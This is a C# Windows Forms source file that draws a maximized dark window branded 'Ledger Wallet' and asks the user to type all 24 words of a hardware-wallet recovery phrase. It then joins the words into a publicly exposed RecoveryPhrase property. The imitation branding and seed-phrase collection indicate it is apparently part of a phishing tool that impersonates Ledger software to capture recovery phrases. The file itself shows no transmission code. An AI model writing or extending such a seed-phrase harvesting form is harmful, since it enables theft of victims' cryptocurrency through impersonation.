using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;

namespace Ledger.MainClassFolder
{
    public partial class RecoveryPhrasePage : Form
    {
        TextBox[] _words = new TextBox[24];
        Label[] _labels = new Label[24];
        string _deviceName;

        Label _title;
        Label _desc;
        Panel _wordPanel;
        RoundedButton _backBtn;
        RoundedButton _readyBtn;

        public string RecoveryPhrase { get; private set; }

        public RecoveryPhrasePage(string deviceName)
        {
            InitializeComponent();
            _deviceName = deviceName;

            Text = "Ledger Wallet";
            WindowState = FormWindowState.Maximized;
            StartPosition = FormStartPosition.Manual;
            BackColor = Color.FromArgb(18, 18, 18);
            DoubleBuffered = true;
            MinimumSize = new Size(900, 600);
            AutoScaleMode = AutoScaleMode.None;

            var screen = Screen.PrimaryScreen.WorkingArea;
            Location = screen.Location;
            Size = screen.Size;

            BuildUI();
            Resize += (s, e) => PerformLayout();
        }

        void BuildUI()
        {
            _title = new Label
            {
                Text = "RESTORE FROM RECOVERY PHRASE",
                Font = new Font("Segoe UI", 20f, FontStyle.Bold),
                ForeColor = Color.White,
                AutoSize = true,
                BackColor = Color.Transparent
            };
            Controls.Add(_title);

            _desc = new Label
            {
                Text = $"Restore your {_deviceName.Replace("Ledger ", "")} from your recovery phrase to restore, replace or back up your Ledger hardware wallet.\n" +
                       $"Your {_deviceName.Replace("Ledger ", "")} will restore your private keys and you will be able to access and manage your crypto.",
                Font = new Font("Segoe UI", 9.5f),
                ForeColor = Color.FromArgb(170, 170, 170),
                BackColor = Color.Transparent,
                AutoSize = true
            };
            Controls.Add(_desc);

            _wordPanel = new Panel { BackColor = Color.Transparent };
            Controls.Add(_wordPanel);

            for (int i = 0; i < 24; i++)
            {
                _labels[i] = new Label
                {
                    Text = $"{i + 1}.",
                    Font = new Font("Segoe UI", 9f, FontStyle.Bold),
                    ForeColor = Color.Gray,
                    BackColor = Color.Transparent,
                    TextAlign = ContentAlignment.MiddleRight
                };
                _wordPanel.Controls.Add(_labels[i]);

                _words[i] = new TextBox
                {
                    BackColor = Color.FromArgb(26, 27, 28),
                    ForeColor = Color.White,
                    BorderStyle = BorderStyle.FixedSingle,
                    Font = new Font("Segoe UI", 10f, FontStyle.Bold),
                    Name = $"word{i + 1}"
                };
                _words[i].KeyPress += Word_KeyPress;
                _wordPanel.Controls.Add(_words[i]);
            }

            _backBtn = new RoundedButton("← Back", false);
            _backBtn.Click += (s, e) =>
            {
                DialogResult = DialogResult.Cancel;
                Close();
            };
            Controls.Add(_backBtn);

            _readyBtn = new RoundedButton("Ok, I'm ready!", true);
            _readyBtn.Click += (s, e) =>
            {
                string[] words = new string[24];
                for (int i = 0; i < 24; i++)
                    words[i] = _words[i].Text.Trim();
                RecoveryPhrase = string.Join(" ", words);
                DialogResult = DialogResult.OK;
                Close();
            };
            Controls.Add(_readyBtn);
        }

        void PerformLayout()
        {
            int cw = ClientSize.Width;
            int ch = ClientSize.Height;

            // Scale-aware margins
            int sideMargin = Math.Max(40, (int)(cw * 0.04));
            int topMargin = Math.Max(20, (int)(ch * 0.03));
            int btnAreaH = Math.Max(60, (int)(ch * 0.08));

            // ── Title ──
            _title.Location = new Point((cw - _title.Width) / 2, topMargin);

            // ── Description ──
            int descMaxW = Math.Min(650, cw - sideMargin * 2);
            _desc.MaximumSize = new Size(descMaxW, 0);
            _desc.Location = new Point((cw - _desc.Width) / 2, _title.Bottom + 15);

            // ── Word grid — scales to fill available space ──
            int gridTop = _desc.Bottom + 20;
            int gridBottom = ch - btnAreaH - 15;
            int gridAvailH = gridBottom - gridTop;
            int gridAvailW = cw - sideMargin * 2;

            // Calculate textbox dimensions based on available space
            int tbH = Math.Max(26, Math.Min(40, gridAvailH / 14));
            int rowGap = Math.Max(2, (gridAvailH - 12 * tbH) / 11);
            if (rowGap > 16) rowGap = 16;
            int gridH = 12 * tbH + 11 * rowGap;

            int lblW = Math.Max(28, (int)(gridAvailW * 0.04));
            int colGap = Math.Max(20, (int)(gridAvailW * 0.04));
            int tbW = Math.Max(120, (gridAvailW - 2 * lblW - colGap) / 2);
            if (tbW > 220) tbW = 220;

            int gridW = 2 * (lblW + tbW) + colGap;
            int gridLeft = (cw - gridW) / 2;

            _wordPanel.SetBounds(gridLeft, gridTop, gridW, gridH);

            int col2Offset = lblW + tbW + colGap;

            // Update font size based on textbox height
            float fontSize = Math.Max(8f, Math.Min(11f, tbH * 0.3f));
            var tbFont = new Font("Segoe UI", fontSize, FontStyle.Bold);
            var lblFont = new Font("Segoe UI", Math.Max(7.5f, fontSize - 1f), FontStyle.Bold);

            for (int i = 0; i < 24; i++)
            {
                int col = i < 12 ? 0 : 1;
                int row = i < 12 ? i : i - 12;
                int baseX = col == 0 ? 0 : col2Offset;
                int yy = row * (tbH + rowGap);

                _labels[i].Font = lblFont;
                _labels[i].SetBounds(baseX, yy, lblW, tbH);

                _words[i].Font = tbFont;
                _words[i].SetBounds(baseX + lblW, yy, tbW, tbH);
            }

            // ── Buttons — anchored to bottom corners ──
            int btnW = Math.Max(120, Math.Min(180, (int)(cw * 0.12)));
            int btnH = Math.Max(36, Math.Min(46, (int)(ch * 0.05)));
            int btnY = ch - btnAreaH + (btnAreaH - btnH) / 2;

            _backBtn.SetBounds(sideMargin, btnY, btnW, btnH);
            _readyBtn.SetBounds(cw - sideMargin - btnW - 20, btnY, btnW + 20, btnH);
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            PerformLayout();
        }

        void Word_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (char.IsLetter(e.KeyChar) || char.IsControl(e.KeyChar) || e.KeyChar == ' ')
                return;
            e.Handled = true;
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing && DialogResult == DialogResult.None)
            {
                DialogResult = DialogResult.Abort;
            }
            base.OnFormClosing(e);
        }

        // ── Rounded button control ──
        class RoundedButton : Control
        {
            bool _filled;
            bool _hovered;

            public RoundedButton(string text, bool filled)
            {
                Text = text;
                _filled = filled;
                SetStyle(
                    ControlStyles.AllPaintingInWmPaint |
                    ControlStyles.UserPaint |
                    ControlStyles.ResizeRedraw |
                    ControlStyles.OptimizedDoubleBuffer,
                    true);
                Cursor = Cursors.Hand;
                Font = new Font("Segoe UI", 9f, FontStyle.Bold);
            }

            protected override void OnMouseEnter(EventArgs e) { _hovered = true; Invalidate(); base.OnMouseEnter(e); }
            protected override void OnMouseLeave(EventArgs e) { _hovered = false; Invalidate(); base.OnMouseLeave(e); }

            protected override void OnPaint(PaintEventArgs e)
            {
                var g = e.Graphics;
                g.SmoothingMode = SmoothingMode.AntiAlias;
                g.Clear(Color.FromArgb(18, 18, 18));

                var rect = new Rectangle(1, 1, Width - 3, Height - 3);
                int r = Math.Min(20, Height / 2);

                using (var path = CreateRoundRect(rect, r))
                {
                    if (_filled)
                    {
                        Color bg = _hovered ? Color.FromArgb(200, 200, 200) : Color.WhiteSmoke;
                        using (var brush = new SolidBrush(bg))
                            g.FillPath(brush, path);
                        TextRenderer.DrawText(g, Text, Font, rect, Color.Black,
                            TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter);
                    }
                    else
                    {
                        Color border = _hovered ? Color.FromArgb(120, 120, 120) : Color.Gray;
                        using (var pen = new Pen(border, 1.5f))
                            g.DrawPath(pen, path);
                        TextRenderer.DrawText(g, Text, Font, rect, Color.White,
                            TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter);
                    }
                }
            }

            static GraphicsPath CreateRoundRect(Rectangle rect, int radius)
            {
                var path = new GraphicsPath();
                int d = radius * 2;
                path.AddArc(rect.X, rect.Y, d, d, 180, 90);
                path.AddArc(rect.Right - d, rect.Y, d, d, 270, 90);
                path.AddArc(rect.Right - d, rect.Bottom - d, d, d, 0, 90);
                path.AddArc(rect.X, rect.Bottom - d, d, d, 90, 90);
                path.CloseFigure();
                return path;
            }
        }
    }
}
